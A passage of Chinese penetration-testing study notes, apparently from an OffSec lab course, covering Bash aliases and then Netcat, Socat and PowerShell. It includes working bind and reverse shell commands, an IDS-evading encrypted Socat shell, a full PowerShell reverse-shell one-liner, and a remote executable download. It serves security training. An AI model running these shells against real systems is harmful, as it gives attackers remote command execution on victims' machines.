13:37:51 export HISTTIMEFORMAT='%F %T '\n```\n\n在这个例子中，我们使用了 %F(年-月-日 ISO 8601 格式) 和 %T(24 小时时间)。其他格式可以在 strftime 手册找到。\n\n### Alias\n\nAlias 是一个我们可以定义的字符串，用来替代一个命令的别称。Alias 对于我们定义的更短的命令或别名来替换常用的命令和选项非常有用。换句话说，Alias 是我们定义的一个命令，由其他命令组成。这方面的一个例子是 ls 命令，我们通常倾向于使用 ls -la（显示结果为一个长列表，包括隐藏的文件）。让我们来看看如何使用 Alias 来取代这个命令。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# alias lsa='ls -la'\n                                                                                            \n┌──(root💀kali)-[~/Desktop]\n└─# lsa    \n总用量 544\ndrwxr-xr-x   5 root root   4096  3月 16 22:52  .\ndrwx------  30 root root   4096  3月 17 00:27  ..\n-rw-r--r--   1 root root 141136  3月 16 00:56  access.log\n-rwxr-xr-x   1 root root    223  3月  2 20:33  Anbox.desktop\ndrwxr-xr-x   3 root root   4096  4月 21  2021  cobaltstrike4\n-rw-------   1 root root   7733 12月 10 02:12  CVE-2021-43798.py\n-rwxr-xr-x   1 root root    180  1月  5 01:51 'Google Chrome.desktop'\ndrwxr-xr-x   4 root root   4096  3月 14 01:12  HTB\n-rw-r--r--   1 root root     88  3月 16 04:17  intro_to_nano.txt\n-rwxr-xr-x   1 root root 332111  2月 19 03:06  linpeas.sh\n-rw-------   1 root root   9185  3月  1 00:17  Lucifiel.ovpn\n-rw-------   1 root root    455 12月 10 02:12  paload.txt\n-rw-r--r--   1 root root   3459  1月 19 22:03  phpshell.php\n-rw-r--r--   1 root root    636  3月 17 00:19  ping_results.txt\n-rw-r--r--   1 root root     60  3月 16 22:00  scan-a.txt\n-rw-r--r--   1 root root     60  3月 16 22:00  scan-b.txt\n-rw-r--r--   1 root root     36  9月 26 22:02  shell.php\ndrwxr-xr-x 109 root root   4096  3月 16 00:10  vulhub\n```\n\n通过定义我们自己的命令 lsa，我们可以快速执行 ls -la，而根本不需要输入任何参数。我们还可以通过运行不带参数的 alias 来查看定义的别名列表。\n\n需要注意的是：alias 命令对用于别名的单词没有任何限制。因此，有可能使用一个已经对应于现有命令的词来创建一个别名，我们可以在下面这个相当随意的例子中看到这一点。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# alias mkdir='ping -c 1 localhost'\n                                                                                            \n┌──(root💀kali)-[~/Desktop]\n└─# mkdir                       \nPING localhost(localhost (::1)) 56 data bytes\n64 bytes from localhost (::1): icmp_seq=1 ttl=64 time=0.075 ms\n\n--- localhost ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 0.075/0.075/0.075/0.000 ms\n```\n\n如果出现这样的情况，解决办法很简单。我们可以退出当前的 shell 会话，或者使用 unalias 命令来取消违规的别名。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# unalias mkdir          \n                                                                                            \n┌──(root💀kali)-[~/Desktop]\n└─# mkdir\nmkdir: 缺少操作数\n请尝试执行 \"mkdir --help\" 来获取更多信息。\n```\n\n### 持久的 Bash 定制\n\nBash 中交互式 Shell 的行为是由位于 /etc/bash.bashrc 的全系统 bashrc 文件决定的。全系统的 Bash 设置可以通过编辑位于任何用户主目录下的 .bashrc 文件而被推翻。\n\n在上一届中，我们探讨了 alias 命令，它为当前的终端会话设置一个别名。我们也可以在用户主目录下的 .bashrc 文件中插入合格命令，以设置一个持久的别名。.bashrc 脚本在该用户登录的任何时候都会被执行。由于这个文件是一个 shell 脚本，我们可以插入任何可以从命令提示符中执行的命令。让我们检查一下 Kali Linux 中默认的 /home/kali/.bashrc 文件的几行。\n\n```bash\nkali@kali:~$ cat ~/.bashrc\n# ~/.bashrc: executed by bash(1) for non-login shells.\n# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)\n# for examples\n...\n# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)\nHISTSIZE=1000\nHISTFILESIZE=2000\n\n# enable color support of ls and also add handy aliases\nif [ -x /usr/bin/dircolors ]; then\n test -r ~/.dircolors && eval \"$(dircolors -b ~/.dircolors)\" || eval \"$(dircolors -\n alias ls='ls --color=auto'\n...\n```\n\n你可能是认出 HISTSIZE 和 HISTFILESIZE 环境变量和显示彩色输出的 alias 命令。\n\n# 实用工具\n\n## Netcat\n\nNetcat，由 Hobbit 于 1995 年首次发布，是 “原始” 的网络渗透测试工具之一，它的功能非常全面，不愧是作者指定的黑客的 “瑞士军刀”。Netcat 最清晰的定义来自 Hobbit 本人：一个简单的 “使用 TCP 或 UDP 协议，在网络连接中读写数据的工具”。\n\n### 连接到一个 TCP/UDP 端口\n\n正如描述所提示的，Netcat 可以在客户或服务器模式下运行。首先，让我们看一下客户端模式。\n\n我们可以使用客户端模式连接到任何 TCP/UDP 端口，允许我们：\n\n- 检查一个端口是否开放或关闭\n- 从某个端口上监听的服务中读取横幅\n- 手动连接到一个网络服务\n\n让我们首先使用 Netcat（nc）来检查 TCP 110 端口（POP3 邮件服务）是否在实验室的一台机器上打开。我们将提供几个参数： `-n` 选项用于跳过 DNS 名称解析； `-v` 用于增加一些粗略的内容；目标 IP 地址；以及目标端口号：\n\n```bash\nkali@kali:~$ nc -nv 10.11.0.22 110\n(UNKNOWN) [10.11.0.22] 110 (pop3) open\n+OK POP3 server lab ready <00003.1277944@lab>\n```\n\n首先，与 10.11.0.22 端口 110（标准属于为 10.11.0.22:110）的 TCP 连接成功了，所以 Netcat 报告远程端口是开放的。接下来，服务器通过 “回话” 来回应我们的连接，打印出服务器欢迎信息，并提示我们登录，这是 POP3 服务的标准行为。\n\n让我们试着与服务器进行交互。\n\n```bash\nkali@kali:~$ nc -nv 10.11.0.22 110\n(UNKNOWN) [10.11.0.22] 110 (pop3) open\n+OK POP3 server lab ready <00004.1546827@lab>\nUSER offsec\n+OK offsec welcome here\nPASS offsec\n-ERR unable to lock mailbox\nquit\n+OK POP3 server lab signing off.\nkali@kali:~$\n```\n\n我们已经成功的使用 Netcat 与 POP3 服务进行了交流（尽管我们的登录尝试失败了）。\n\n### 监听 TCP/UDP 端口\n\n使用 Netcat 监听 TCP/UDP 端口对于客户程序的网络调试或接收 TCP/UDP 网络连接非常有用。让我们尝试实现一个涉及两台机器的简单聊天服务，使用 Netcat 作为客户端和服务器。\n\n在一台 IP 为 10.11.0.22 的 Windows 机器上，我们将 Netcat 设置为监听 TCP 4444 端口上的传入连接。我们将使用 `-n` 选项禁用 DNS 名称解析， `-l` 创建一个监听器， `-v` 增加一些详情信息， `-p` 指定监听端口号。\n\n```bash\nC:\\\\Users\\\\offsec> nc -nlvp 4444\nlistening on [any] 4444 ...\n```\n\n现在我们已经将 Windows 机器上的 4444 端口与 Netcat 绑定，让我们从 Llinux 机器上连接到该端口并输入一行字。\n\n```bash\nkali@kali:~$ nc -nv 10.11.0.22 4444\n(UNKNOWN) [10.11.0.22] 4444 (?) open\nThis chat is from the linux machine\n```\n\n我们的文本将通过 TCP 端口 4444 发送到 Windows 机器上，我们可以在 Windows 机器上继续 “聊天”。\n\n```bash\nC:\\\\Users\\\\offsec> nc -nlvp 4444\nlistening on [any] 4444 ...\nconnect to [10.11.0.22] from <UNKNOWN) [10.11.0.4] 43447\nThis chat is from the linux machine\n\nThis chat is from the windows machine\n```\n\n### 用 Netcat 传输文件\n\nNetcat 也可以用来从一台计算机向另一台计算机传输文件，包括文本和二进制文件。事实上，取证调查员经常将 Netcat 和 dd（磁盘复制工具）结合使用，在网络上创建符合取证要求的磁盘图像。\n\n为了从我们的 Kali 虚拟机向 Windows 系统发送文件，我们启动了一个与之前的聊天例子类似的设置，但有一些轻微的不同。在 Windows 机器上，我们将在 4444 端口设置一个 Netcat 监听器，并将任何输出重定向到一个名为 incoming.exe 文件。\n\n```bash\nC:\\\\Users\\\\offsec> nc -nlvp 4444 > incoming.exe\nlistening on [any] 4444 ...\n```\n\n在 kali 系统中，我们将通过 TCP 4444 端口将 wget.exe 文件推送到 Windows 机器上。\n\n```bash\nkali@kali:~$ locate wget.exe\n/usr/share/windows-resources/binaries/wget.exe\n\nkali@kali:~$ nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe\n(UNKNOWN) [10.11.0.22] 4444 (?) open\n```\n\n连接由 Windows 上的 Netcat 接收，如下所示：\n\n```bash\nC:\\\\Users\\\\offsec> nc -nlvp 4444 > incoming.exe\nlistening on [any] 4444 ...\nconnect to [10.11.0.22] from <UNKNOWN) [10.11.0.4] 43459\n^C\nC:\\\\Users\\\\offsec>\n```\n\n请注意，我们没有收到 Netcat 对我们文件上传进度的任何反馈。在这种情况下，由于我们上传的文件很小，我们可以先等待几秒钟，然后通过尝试运行文件来检查文件是否已经完全上传到 Windows 机器上。\n\n```bash\nC:\\\\Users\\\\offsec> incoming.exe -h\nGNU Wget 1.9.1, a non-interactive network retriever.\nUsage: incoming [OPTION]... [URL]...\n```\n\n我们可以看到，这实际上是 wget.exe 可执行文件，而且文件传输成功了。\n\n### 用 Netcat 进行远程管理\n\nNetcat 最有用的功能之一是它能够进行命令重定向。Netcat-traditional 版本的 Netcat（用 “-DGAPING_SECURITY_HOLE” 标志编译）启用了 `-e` 选项。在建立或接收一个成功的连接后执行一个程序。这个强大的功能从安全的角度开辟了各种有趣的可能性，因此在大多数现代 Linux/BSD 系统中是不可用的。然而，由于 Kali Linux 是一个渗透测试发行版，Kali 中包含的 Netcat 版本支持 `-e` 选项。\n\n启用后，该选项可执行文件的输入、输出和错误信息重定向到一个 TCP/UDP 端口，而不是默认的控制台。\n\n例如，考虑 cmd.exe 可执行文件。通过将 stdin、stdout 和 stderr 重定向到网络，我们可以将 cmd.exe 绑定到一个本地端口。任何连接到这个端口的人都会在目标计算机上看到一个命令提示。为了弄清楚这一点，让我们再运行几个涉及到 Bob 和饿Alice 的场景。\n\n- **Netcat 正向 Shell 场景**\n\n  再我们的第一个场景中，Bob（运行 Windows）请求 Alice（运行 Linux）的帮助，并要求她连接到他的计算机并远程发布一些命令。Bob 有一个公共 IP 地址，并直接连接到互联网。然而，Alice 再一个 NAT 的连接后面，有一个内部 IP 地址。为了完成这个方案，Bob 需要将 cmd.exe 绑定到他的公共 IP 地址上的一个TCP端口，并要求 Alice 连接到他的特定 IP 地址和端口。\n\n  Bob 将检查他的本地 IP 地址，然后用 `-e` 选项运行 Netcat，一旦连接到监听端口就执行 cmd.exe。\n\n  ```bash\n  C:\\\\Users\\\\offsec> ipconfig\n  Windows IP Configuration\n  Ethernet adapter Local Area Connection:\n  \tConnection-specific DNS Suffix . :\n  \tIPv4 Address. . . . . . . . . . . : 10.11.0.22\n  \tSubnet Mask . . . . . . . . . . . : 255.255.0.0\n  \tDefault Gateway . . . . . . . . . : 10.11.0.1\n  \n  C:\\\\Users\\\\offsec> nc -nlvp 4444 -e cmd.exe\n  listening on [any] 4444 ...\n  ```\n\n  现在 Netcat 已经将 TCP 4444 端口与 cmd.exe 绑定，并将 cmd.exe 的任何输入、输出或错误信息重定向到网络。换句话说，任何连接到 Bob 机器上的 TCP 4444 端口的人（希望是 Alice）都会看到 Bob 的命令提示。这的确是一个“巨大的安全漏洞”！\n\n  ```bash\n  kali@kali:~$ ip address show eth0 | grep inet\n   inet 10.11.0.4/16 brd 10.11.255.255 scope global dynamic eth0\n  \n  kali@kali:~$ nc -nv 10.11.0.22 4444\n  (UNKNOWN) [10.11.0.22] 4444 (?) open\n  Microsoft Windows [Version 10.0.17134.590]\n  (c) 2018 Microsoft Corporation. All rights reserved.\n  \n  C:\\\\Users\\\\offsec> ipconfig\n  Windows IP Configuration\n  Ethernet adapter Local Area Connection:\n   Connection-specific DNS Suffix . :\n   IPv4 Address. . . . . . . . . . . : 10.11.0.22\n   Subnet Mask . . . . . . . . . . . : 255.255.0.0\n   Default Gateway . . . . . . . . . : 10.11.0.1\n  ```\n\n  正如我们所看到的，这与预期的工作一样。下面的图片描述了这种情况：\n\n  ![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/06439b20-99f3-4456-a7a9-f02e37534e70/Untitled.png)\n\n- **反向 Shell 场景**\n\n  在我们的第二个场景中，Alice 需要 Bob 的帮助。然而，Alice 对她办公室里的路由器没有控制权，因此不能将流量从路由器转发到她的机器内部。\n\n  在这种情况下，我们可以利用 Netcat 的另一个有用的功能；能够发送命令 Shell 到一个特定的端口上监听的主机。在这种情况下，尽管 Alice 不能在她的计算机上为 /bin/bash 绑定一个端口，并期望 Bob 能够连接，但她可以将她的命令提示符的控制权发送给 Bob 的机器。这就是所谓的反向 Shell。为了实现这个目的，Bob 首先要设置 Netcat 来监听一个传入的 Shell。在我们的例子中，我们将使用 4444 端口。\n\n  ```bash\n  C:\\\\Users\\\\offsec> nc -nlvp 4444\n  listening on [any] 4444 ...\n  ```\n\n  现在，Alice 可以从她的 Linux 机器向 Bob 发送一个反向 Shell。再一次，我们使用 `-e` 选项来使一个应用程序远程可用，在这种情况下，它恰好是 /bin/bash，Linux shell。\n\n  ```bash\n  kali@kali:~$ ip address show eth0 | grep inet\n   inet 10.11.0.4/16 brd 10.11.255.255 scope global dynamic eth0\n  \n  kali@kali:~$ nc -nv 10.11.0.22 4444 -e /bin/bash\n  (UNKNOWN) [10.11.0.22] 4444 (?) open\n  ```\n\n  一旦连接建立，Alice 的 Netcat 将把 /bin/bash 的输入、输出和错误数据流重定向到 4444 端口的 Bob 的机器上，Bob 可以与该 Shell 交互。\n\n  ```bash\n  C:\\\\Users\\\\offsec>nc -nlvp 4444\n  listening on [any] 4444 ...\n  connect to [10.11.0.22] from <UNKNOWN) [10.11.0.4] 43482\n  \n  ip address show eth0 | grep inet\n   inet 10.11.0.4/16 brd 10.11.255.255 scope global dynamic eth0\n  ```\n\n  花一些时间考虑绑定和反向 Shell 之间的差异，以及从组织安全的角度来看，这些差异可能适用于各种防火墙配置。重要的是要认识到，流出的流量与流入的流量一样的有害。下图描述了反向 Shell 的情况，Bob 在 Alice 的 Linux 机器上获得了远程 Shell 访问，穿越了公司防火墙。\n\n  ![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/81966b24-1aac-4ddb-a3d4-2573ce2698bb/Untitled.png)\n\n## Socat\n\nsocat 是一个命令行工具，可以建立两个双向的字节流，并在它们之间传输数据。对于渗透测试，它类似于 Netcat，但有额外的有用功能。\n\n虽然 socat 可以做很多事情，但我们只介绍其中的几个，以说明其用途。让我们开始探索 socat，看看它与 Netcat 的比较。\n\n### Netcat VS Socat\n\n首先，让我们用 Netcat 和 Socat 连接到 80 端口的远程服务器。\n\n```bash\nkali@kali:~$ nc <remote server's ip address> 80\n\nkali@kali:~$ socat - TCP4:<remote server's ip address>:80\n```\n\n注意，语法相似，但 socat 需要 `-` 在 STDIO 和远程主机之间传输数据（允许我们的键盘与 shell 互动）和协议（TCP4）。协议、选项和端口号是冒号分隔的。\n\n因此将监听器绑定到 1024 以下的端口需要 root 权限，所以我们在启动 443 端口的监听器时需要使用 sudo。\n\n```bash\nkali@kali:~$ sudo nc -lvp localhost 443\n\nkali@kali:~$ sudo socat TCP4-LISTEN:443 STDOUT\n```\n\n请注意，需要添加监听器的协议（TCP-LISTEN）和 STDOUT 参数，它可以重定向标准输出。\n\n### Socat 文件传输\n\n接下来，我们将尝试一下文件传输。继续之前虚构的 Alice 和 Bob 角色，假设 Alice 需要给 Bob 发送一个叫做 secret_passwords.txt 的文件。作为提醒。Alice的主机运行在 Linux上，而 Bob 的主机运行在 Windows上。让我们来看看这个动作。\n\n在 Alice 这边，我们将在 443 端口共享文件。在这个例子中，TCP4-LISTEN 选项制定了一个 IPv4 监听器，一旦与监听器建立连接，fork 就会创建一个子进程，它允许多个连接，而 file: 制定了要传输的文件的名称。\n\n```bash\nkali@kali:~$ sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt\n```\n\n在 Bob 这边，我们将连接到 Alice 的电脑并检索文件。在这个例子中，TCP4 选项指定了 IPv4，后面是 Alice 的 IP 地址（10.11.0.4）和监听端口号（443），file: 指定了在 Bob 的计算机上保存文件的本地文件名，create 指定了将创建一个新文件。\n\n```bash\nC:\\\\Users\\\\offsec> socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create\n\nC:\\\\Users\\\\offsec> type received_secret_passwords.txt\n\"try harder!!!\"\n```\n\n### Socat 反向 Shell\n\n让我们来看看使用 socat 的反向 Shell。首先，Bob 将在 443 端口启动一个监听器。要做到这一点，他将提供 `-d` 选项来增加粗略性（显示致命、错误、警告和通告信息），TCP4-LISTEN:443 来在 443 端口创建一个 IPv4 监听器。STDOUT 来连接标准输出（STDOUT）到 TCP 套接字。\n\n```bash\nC:\\\\Users\\\\offsec> socat -d -d TCP4-LISTEN:443 STDOUT\n... socat[4388] N listening on AF=2 0.0.0.0:443\n```\n\n接下来，Alice 将使用 socat 的 EXEC选项（类似于 netcat 的 `-e` 选项），一旦建立了远程连接，它将执行给定的程序。在这种情况下，Alice 将发送一个 /bin/bash 反向 Shell（用 EXEC :/bin/bash）到 Bob 的监听套接字 10.11.0.22:443。\n\n```bash\nkali@kali:~$ socat TCP4:10.11.0.22:443 EXEC:/bin/bash\n```\n\n一旦连接，Bob 可以从他的 socat 绘画中输入命令，这些命令将在 Alice 的机器上执行。\n\n```bash\n... socat[4388] N accepting connection from AF=2 10.11.0.4:54720 on 10.11.0.22:443\n... socat[4388] N using stdout for reading and writing\n... socat[4388] N starting data transfer loop with FDs [4,4] and [1,1]\nwhoami\nkali\nid\nuid=1000(kali) gid=1000(kali) groups=1000(kali)\n```\n\n这是一个很好的开始，我们已经涵盖了一些重要的主题，但到目前为止，我们所有的 socat 加密的基本知识。\n\n### Socat 加密的 正向 Shell\n\n为了给绑定的 Shell 增加加密，我们将依靠安全套接字层证书。这种级别的加密将有助于躲避入侵检测系统（IDS），并有助于隐藏我们正在传输的敏感数据。\n\n继续以 Alice 和 Bob 为例，我们将使用 openssl 应用程序创建一个自签名的证书，使用以下选项。\n\n- req：发起一个新的证书签署请求\n- newkey：生成一个新的私钥\n- ras:2048：使用 RSA 加密，秘钥长度为 2048 位\n- nodes：存储没有口令保护的私钥\n- keyout：将秘钥保存到一个文件中\n- x509：输出一个自签名的证书，而不是一个证书请求\n- days：设置有效期，以天为单位\n- out：将证书保存到一个文件中\n\n一旦我们生成了秘钥，我们将把证书和它的私钥存到一个文件夹里，我们最终将用它来加密我们的 正向 Shell。\n\n我们现在讲在 Alice 的机器上完成这个过程。\n\n```bash\nkali@kali:~$ openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days\n362 -out bind_shell.crt\nGenerating a 2048 bit RSA private key\n....................+++\n...............................+++\nwriting new private key to 'bind_shell.key'\n-----\nYou are about to be asked to enter information that will be incorporated\ninto your certificate request.\nWhat you are about to enter is what is called a Distinguished Name or a DN.\nThere are quite a few fields but you can leave some blank\nFor some fields there will be a default value,\nIf you enter '.', the field will be left blank.\n-----\nCountry Name (2 letter code) [AU]:US\nState or Province Name (full name) [Some-State]:Georgia\nLocality Name (eg, city) []:Atlanta\nOrganization Name (eg, company) [Internet Widgits Pty Ltd]:Offsec\nOrganizational Unit Name (eg, section) []:Try Harder Department\nCommon Name (e.g. server FQDN or YOUR name) []:\nEmail Address []:\nkali@kali:~$ cat bind_shell.key bind_shell.crt > bind_shell.pem\n```\n\n现在秘钥和证书已经生成，我们首先需要把它们转换成 socat 可以接受的格式。为此，我们在创建加密的 socat 监听器之前，将 bind_shell.key 和 bind_shell.crt 两个文件合并成一个 .pem 文件。\n\n我们将使用 OPENSSL-LISTEN 选项在 443 端口创建监听器，cert=bind_shell.pem 来指定我们的证书文件，verify 来禁用 SSL 验证，fork 来在监听器有连接时生成一个子进程。\n\n```bash\nkali@kali:~$ sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork\nEXEC:/bin/bash\n```\n\n现在，我们可以将 Bob 的电脑连接到 Alice 的 正向 shell。\n\n我们将使用 `-` 在 STDIO 和远程主机之间传输数据，使用 OPENSSL 建立一个远程 SSL 连接到 10.11.0.4:443 的 Alice 监听器，使用 verify=0 来禁用 SSL 证书验证。\n\n```bash\nC:\\\\Users\\\\offsec> socat - OPENSSL:10.11.0.4:443,verify=0\nid\nuid=0(root) gid=0(root) groups=0(root)\nwhoami\nroot\n```\n\n很好！我们的正向 shell 创建成功了，我们能够向 Alice 的机器传递命令。\n\n花些时间自己去探索 socat。这是许多工具中的一个，在渗透测试中会非常有益。\n\n## PowerShell 和 Powercat\n\nWindows PowerShell 是一种基于任务的命令行外壳和脚本语言。它是专门为系统管理员和电力用户涉及的，用于快速自动化管理多个操作系统（Linux、MacOS、Unix 和 Windows）以及在这些系统上运行的应用程序的相关进程。\n\n毋庸置疑，PowerShell 是一个强大的渗透测试工具，可以安装在（或默认安装在）各种版本的 Windows 上。从 Winodws Server 2008 R2 和 Windows 7 开始，它被默认安装在现代 Windows 平台上。Windows PowerShell 5.0 可以在以下版本的 Windows 上运行。\n\n- Windows Server 2016 默认安装\n- Windows Server 2012 R2/Windows 2012/Windows Server 2008 R2 with Service Pack 1/Windows 8.1/Windows7 with Service Pack 1（安装 Windows Management Framework 5.0 以运行它）\n\nWindows PowerShell 4.0 可以在以下版本的 Winodws 中运行。\n\n- Windows 8.1/Windows Server 2012 R2 默认安装\n- 带有 Service Pack 的 Windows 7/带有 Service Pack 的 Windows Server 2008 R2（安装 Windows Management Framework 4.0 以运行它）\n\nWindows PowerShell 3.0 可以在以下版本的 Windows 中运行。\n\n- Windows 8/Windows Server 2012 默认安装\n- 带有 Service Pack 的 Windows 7/带有 Service Pack 1/2 的 Windows Server 2008 R2（安装 Windows Management Framework 3.0 以运行它）\n\nPowerShell 包含一个内置的集成开发环境（IDE），被称为 Windows PowerShell 集成脚本环境（ISE）。ISE 是 Windows PowerShell 的一个主机应用程序，使我们能够在一个基于 Winodws 的图形用户界面中运行命令、编写、测试和调试脚本。该界面提供多行编辑、标签完成、语法着色、选择性执行、上下文敏感帮助、支持从右到左的语言等等。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/aa0559c6-074d-4166-ae5a-b67a69a4cd5c/Untitled.png)\n\nPowerShell 维护一个执行策略，决定哪种类型的 PowerShell 脚本（如果有的话）可以在系统上运行。默认策略是“受限”，这实际上意味着系统既不会加载 PowerShell 配置文件，也不会运行 PowerShell 脚本。为了本模块的目的，我们需要在 Windows 客户机上设置一个“不受限制”的执行策略。要做到这一点，我们点击 Windows 开始按钮，右键单击 Windows PowerShell 应用程序，选择以管理员身份运行。当出现用户账户控制提示时，选择是，并输入 Set-ExecutionPolicy Unrestricted。\n\n```bash\nWindows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved.\n\nPS C:\\\\WINDOWS\\\\system32> Set-ExecutionPolicy Unrestricted\n\nExecution Policy Change\nThe execution policy helps protect you from scripts that you do not trust. Changing\nthe execution policy might expose you to the security risks described in the\nabout_Execution_Policies help topic at https:/go.microsoft.com/fwlink/?LinkID=135170.\nDo you want to change the execution policy?\n[Y] Yes [A] Yes to All [N] No [L] No to All [S] Suspend [?] Help (default is\n\"N\"): y\n\nPS C:\\\\WINDOWS\\\\system32> Get-ExecutionPolicy\nUnrestricted\n```\n\nPowerShell 既反映迅速又功能强大，使我们能够执行多种任务，而无需在目标上安装额外的工具。让我们再来探讨一下 PowerShell，以展示它在渗透测试中可能发挥的作用。\n\n### PowerShell 文件传输\n\n继续讨论 Alice 和 Bob，我们将使用 PowerShell 从 Bob 向 Alice 传输一个文件。由于 PowerShell 的强大和灵活，这并不像使用 Netcat 甚至 Socat 那样简单明了，使得这前几个命令乍一看有点混乱。我们将执行该命令，然后分解各部分。\n\n```bash\nC:\\\\Users\\\\offsec> powershell -c \"(new-objectSystem.Net.WebClient).DownloadFile('<http://10.11.0.4/wget.exe','C:\\\\Users\\\\offsec\\\\Desktop\\\\wget.exe>')\"\n\nC:\\\\Users\\\\offsec\\\\Desktop> wget.exe -V GNU Wget 1.9.1\n\nCopyright (C) 2003 Free Software Foundation, Inc.\nThis program is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\nGNU General Public License for more details.\n\nOriginally written by Hrvoje Niksic <hniksic@xemacs.org>.\n```\n\n我们可以看到，命令执行了，文件被转移了，而且执行得很顺利。让我们分析一下使之发生的 PowerShell 命令。\n\n首先，我们使用了 `-c` 选项。这将执行所提供的命令（用双引号包裹），就像在 PowerShell 提示符下输入的那样。\n\n我们正在执行的命令包含几个部分。首先，我们使用 “newobject” cmdlet，它允许我们实例化一个 .Net 框架或一个 COM 对象。在这种情况下，我们正在创建一个 WebClient 类的实例，它是在 [System.Net](http://System.Net) 命名空间中定义和实现的。WebClient 类用于访问由 URI 识别的资源，它暴露了一个名为 DownloadFile 的公共方法，该方法需要我们的两个关键参数：一个源位置（如我们之前所说的 URI 形式），以及一个目标位置，检索到的数据库将被存储在那里。\n\n这个语法可能看起来很混乱，但实际上是相当简单的。请参考微软 [System.Net](http://System.Net) 参考资料，看看这个命名空间中所有实现的类的列表。然后，接着看 WebClient 类，最后看 DownloadFile 方法，以直观地了解我们的例子中使用的类和方法的结构。\n\n在 Bob 的电脑上下载了 wget.exe 可执行文件后，他可以把它作为另一个工具来下载更多的文件或继续使用 PowerShell。\n\n### PowerShell 反向 Shell\n\n在本节中，我们将利用 PowerShell 单代码来执行 Shell，首先是一个反向 Shell。\n\n首先，我们将在 Alice 的电脑上设置一个简单的 Netcat 监听器：\n\n```bash\nkali@kali:~$ sudo nc -lnvp 443\nlistening on [any] 443 ...\n```\n\n接下来，我们将从 Bob 的电脑上发送一个 PowerShell 反向 Shell。同样，这在语法上不如 Netcat 或 Socat 干净，但由于 PowerShell 在大多数现代 Winodws 机器上是原生的，所以我们探索这个 PowerShell 的等价物是很重要的。首先，让我们看一下代码，然后把他分解。\n\n```bash\n$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);\n$stream = $client.GetStream();\n[byte[]]$bytes = 0..65535|%{0};\nwhile(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)\n{\n $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n $sendback = (iex $data 2>&1 | Out-String );\n $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\n $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n $stream.Write($sendbyte,0,$sendbyte.Length);\n $stream.Flush();\n}\n$client.Close();\n```\n\n与我们以前使用的工具相比，这可能看起来非常复杂。然而，PowerShell 是强大而灵活的；它不是一个单一功能的工具。正因为如此。我们必须使用一个复杂的语法来调用复杂的功能。\n\n这段代码由几个命令组成，用分号隔开。首先，我们看到一个客户端变量，它被分配了目标 IP 地址，一个流变量，一个称为 bytes 的字节数组，以及一个 while 循环，接着是一个关闭客户端连接的调用。在 while 循环中，我们可以看到几行负责向网络流读写数据。请注意，iex（”Invoke-Expression”）cmdlet 是这个代码块的关键部分，因为它把收到的任何字符串作为命令运行，然后命令的结果被重定向并通过数据流发送回来。\n\n这段代码可以被卷进一个公认的冗长的单行代码，在命令提示符下执行：\n\n```bash\nC:\\\\Users\\\\offsec> powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | OutString );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}$client.Close()\"\n```\n\n这个单行代码乍一看似乎非常艰巨，但没有必要记住它；在现场渗透测试中，我们可能会复制和粘贴这种类型的命令（替换 IP 和端口号）。\n\n最后，我们用 Netcat 接收反向 Shell。\n\n```bash\nkali@kali:~$ sudo nc -lnvp 443\nlistening on [any] 443 ...\nconnect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 63515\n\nPS C:\\\\Users\\\\offsec>\n```\n\n总之，通过简单的替换 System.Net.Sockets.TCPClient 调用中的 IP 地址和端口号，我们可以很容易地重复使用这个 PowerShell 反向 Shell 命令。\n\n### PowerShell 正向 Shell\n\n在处理正向 Shell 的时候，过程是相反的。我们首先通过 PowerShell 在 Bob 的电脑上创建正向 Shell，然后用 Netcat 从 Alice 的电脑上连接到它。\n\n在下面的代码片段中，我们将再次使用 `-c` 选项将我们的命令传递给 PowerShell。与反向 Shell 一样，这个复杂的命令可以分解成几个命令。除了客户端、流和字节集变量外，我们还有一个新的监听器变量，它使用 System.Net.Sockets.TcpListener 类。这个类需要两个参数：首先是要监听的地址，其次是端口。通过提供 0.0.0.0 作为本地地址，我们的正向 Shell 将在系统的所有 IP 地址上可用。同样，我们使用 iex cmdlet 来执行我们的命令。\n\n```bash\nC:\\\\Users\\\\offsec> powershell -c \"$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '>';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()\"\n```\n\n有了正向 Shell 的监听，我们可以从 Alice 